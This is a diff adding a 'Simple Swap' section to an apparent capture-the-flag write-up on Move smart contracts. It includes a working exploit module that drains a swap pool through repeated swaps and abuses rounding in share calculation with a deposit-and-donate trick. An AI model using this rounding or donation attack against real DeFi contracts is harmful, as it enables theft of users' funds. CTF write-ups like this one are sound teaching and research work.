@@ -290,6 +290,45 @@ module solution::exploit {
 
 ## Simple Swap
 
+As the name of the challenge suggests, this challenge is about swapping two coins. The most important thing is that we can use `0x1338::exploit::admin_deposit` to make the `challenger` to be the `signer` of the transaction and call the `deposit` function which passes 8 APT.
 
+And another point is that challenge contract use `amount * total_supply / total_asset` to calculate the value of shares, so the decimal part here will be ignored. We just need to deposit and donate a specific amount of currency to withdraw more currency than we deposit.
+
+The solution contract is as follows and the comments contains the state of the contract after each swap operation:
+
+```move
+module solution::exploit {
+    use challenge::swap::{Self, APT, TokenB};
+
+    public entry fun solve(account: &signer) {
+        // (A: 20, B: 20) (A: 6, B: 0)
+        swap::swap<APT, TokenB>(account, 6, true);
+        // (A: 26, B: 14) (A: 0, B: 6)
+        swap::swap<APT, TokenB>(account, 6, false);
+        // (A: 15, B: 20) (A: 11, B: 0)
+        swap::swap<APT, TokenB>(account, 11, true);
+        // (A: 26, B: 6) (A: 0, B: 14)
+        swap::swap<APT, TokenB>(account, 6, false);
+        // (A: 0, B: 12) (A: 26, B: 8)
+    }
+
+    public entry fun step1(account: &signer) {
+        swap::claim(account);
+        // supply: 0, asset: 0
+        swap::deposit(account, 1);
+        // supply: 1, asset: 1
+        swap::donate(account, 4);
+        // supply: 1, asset: 5
+        // admin deposit 8
+        // supply: 2, asset: 13
+    }
+
+    public entry fun step2(account: &signer) {
+        // supply: 2, asset: 13
+        swap::withdraw(account, 1);
+        // supply: 1, asset: 7
+    }
+}
+```
 
 ![](./images/9.png)
